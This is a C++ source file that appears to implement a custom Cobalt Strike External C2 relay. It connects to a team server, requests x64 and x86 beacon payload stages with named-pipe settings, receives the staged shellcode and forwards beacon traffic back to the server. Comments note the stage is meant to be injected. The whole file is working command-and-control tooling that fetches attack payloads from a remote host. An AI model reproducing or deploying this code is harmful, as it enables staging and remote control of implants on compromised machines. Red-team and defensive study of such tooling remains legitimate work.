#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <vector>
#include <stdexcept>
#include "teamserver.hpp"
#include "constants.hpp"
#include <iostream>
#include "helpers.hpp"


//pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c#L84

//DWORD recv_frame(SOCKET my_socket, char* buffer, DWORD max) {
//	DWORD size = 0, total = 0, temp = 0;
//
//	/* read the 4-byte length */
//	recv(my_socket, (char*)&size, 4, 0);
//
//	/* read in the result */
//	while (total < size) {
//		temp = recv(my_socket, buffer + total, size - total, 0);
//		total += temp;
//	}
//
//	return size;
//}

//converetd to vector 
std::vector<uint8_t> recv_frame(SOCKET my_socket) {
	std::cout << "[TS] Reciving frame from TS" << std::endl;
	uint32_t size = 0;
	uint32_t total = 0;

	// read exactly 4 bytes for the frame size
	uint8_t size_bytes[4];
	int ret = recv(my_socket, reinterpret_cast<char*>(size_bytes), 4, 0);
	std::cout << "[TS] Data from TS size: " << ret << std::endl;
	if (ret != 4) {
		throw std::runtime_error("Failed to read frame size");
	}

	// convert to uint32_t (little-endian assumption)
	size = size_bytes[0] | (size_bytes[1] << 8) | (size_bytes[2] << 16) | (size_bytes[3] << 24);

	std::vector<uint8_t> buffer;
	buffer.reserve(size);

	while (total < size) {
		std::cout << "[TS] Loop - Getting data from TS: " << std::endl;
		uint8_t temp_buf[4096];  // read in chunks
		int to_read = std::min<int>(size - total, sizeof(temp_buf));
		ret = recv(my_socket, reinterpret_cast<char*>(temp_buf), to_read, 0);
		if (ret <= 0) {
			throw std::runtime_error("recv failed or connection closed");
		}

		buffer.insert(buffer.end(), temp_buf, temp_buf + ret);
		total += ret;
	}

	return buffer;
}

/* send a frame via a socket */
void send_frame(SOCKET my_socket, char* buffer, int length) {
	std::cout << "[TS] Sending frame to TS" << std::endl;
	std::cout << "[TS] Sending size of frame: "<< length << std::endl;
	send(my_socket, (char*)&length, 4, 0);
	std::cout << "[TS] Sending data of frame." << std::endl;
	send(my_socket, buffer, length, 0);
}

//I'm being lazy so we have 2 funcs, one for x86 and one for x64
std::vector<uint8_t> getx64Payload() {
	std::cout << "[?] Getting x64 from TeamServer" << std::endl;
	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
	sock.sin_port = htons(TeamServer::port);

	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
		exit(0);
		//return;
	}

	send_frame(socket_extc2, (char*)"arch=x64", 8);
	send_frame(socket_extc2, (char*)"pipename=somepipe", 17);
	send_frame(socket_extc2, (char*)"block=100", 9);

	/*
	 * request + receive + inject the payload stage
	 */

	 /* request our stage */
	send_frame(socket_extc2, (char*)"go", 2);

	//get payload
	std::vector<uint8_t> payload = recv_frame(socket_extc2);

	//std::vector<uint8_t> tempPayload;
	//std::cout << "[?] Payload: ";
	//printHexVector(payload);
	std::cout << "[?] Payload of size " << payload.size() << " recieved. " << std::endl;
	return payload;
};

std::vector<uint8_t> getx86Payload() {
	std::cout << "[?] Getting x86 from TeamServer" << std::endl;
	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
	sock.sin_port = htons(TeamServer::port);

	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
		exit(0);
		//return;
	}

	send_frame(socket_extc2, (char*)"arch=x86", 8);
	send_frame(socket_extc2, (char*)"pipename=foobar", 15);
	send_frame(socket_extc2, (char*)"block=100", 9);

	/*
	 * request + receive + inject the payload stage
	 */

	 /* request our stage */
	send_frame(socket_extc2, (char*)"go", 2);

	//get payload
	std::vector<uint8_t> payload = recv_frame(socket_extc2);

	//std::vector<uint8_t> tempPayload;
	std::cout << "[?] Payload of size " << payload.size() << " recieved. " <<std::endl;
	//printHexVector(payload);
	return payload;
};

//dingus im using the wrong socket

std::vector<uint8_t> forwardToTeamserver(std::vector<uint8_t> dataForTeamserver) {
	std::cout << "[?] Forwarding data to TeamServer" << std::endl;
	struct sockaddr_in 	sock;
	sock.sin_family = AF_INET;
	sock.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
	sock.sin_port = htons(TeamServer::port);

	SOCKET socket_extc2 = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(socket_extc2, (struct sockaddr*)&sock, sizeof(sock))) {
		printf("Could not connect to %s:%d\n", TeamServer::address.c_str(), TeamServer::port);
		exit(0);
		//return;
	}

	//send adn rec frame as needed

	send_frame(socket_extc2, reinterpret_cast<char*>(dataForTeamserver.data()), dataForTeamserver.size());
	std::cout << "Data going to TS: " << std::endl;
	//printHex(reinterpret_cast<char*>(it->second.fromClientBuffer.data()), it->second.fromClientBuffer.size())

	std::cout << "[+] Sent to teamserver" << std::endl;

	//need to get data back from TS I think
	//char buffer[1024];
	//auto frame = recv_frame(sock, buffer, 1024*1024);

	//for (size_t i = 0; i < 1024; ++i) {
	//    printf("%02X ", buffer[i]);
	//}
	//printf("\n");
	//printHexVector(frame);

	auto frame = recv_frame(socket_extc2);
	std:: cout << "[?] Success Recv from TS" << std::endl;
	return frame;


}